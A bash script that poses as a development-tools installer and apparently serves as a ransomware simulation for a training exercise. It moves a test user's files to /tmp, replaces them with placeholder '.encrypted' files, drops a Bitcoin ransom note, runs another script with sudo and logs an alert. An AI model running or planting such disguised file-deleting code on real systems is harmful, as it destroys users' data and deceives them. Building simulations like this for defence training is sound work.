#!/bin/bash
echo "Installing development tools..."
sleep 2
echo "Downloading dependencies..."
sleep 1
# Ransomware simulation
echo "Error: Malicious payload detected! Encrypting files..."
WORK_DIR="/home/testuser/work"
BACKUP_DIR="/tmp/original_files"
mkdir -p "$BACKUP_DIR"
# Backup and encrypt files
for file in "$WORK_DIR"/*; do
    if [ -f "$file" ]; then
        filename=$(basename "$file")
        # Backup original
        cp "$file" "$BACKUP_DIR/"
        # Create encrypted version
        echo "ENCRYPTEDDATA$(date +%s)" > "$file.encrypted"
        # Remove original
        rm "$file"
        echo "Encrypted: $filename -> $filename.encrypted"
    fi
done
# Create ransom note
cat > "$WORK_DIR/README_RANSOM.txt" << 'EOD'
===============================================
YOUR FILES HAVE BEEN ENCRYPTED!
===============================================
All your important files have been encrypted with military-grade encryption.
To recover your files, you must pay 0.5 Bitcoin to:
1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
After payment, contact: recovery@notreal.com
with your unique ID: CT101-$(date +%s)
DO NOT attempt to decrypt files yourself!
DO NOT restart your computer!
===============================================
EOD
echo "RANSOMWARE SIMULATION COMPLETED!"

# Set executable permission for setup_tools.sh
chmod +x ./setup_tools.sh

# Run the setup_tools.sh script
sudo ./setup_tools.sh

# Log the number of encrypted files
logger -p local0.crit "RANSOMWARE_ALERT: Files encrypted in $WORK_DIR - $(ls $WORK_DIR/*.encrypted 2>/dev/null | wc -l) files affected"

echo "Files in $WORK_DIR have been 'encrypted'"
echo "Check $WORK_DIR/README_RANSOM.txt for ransom note"
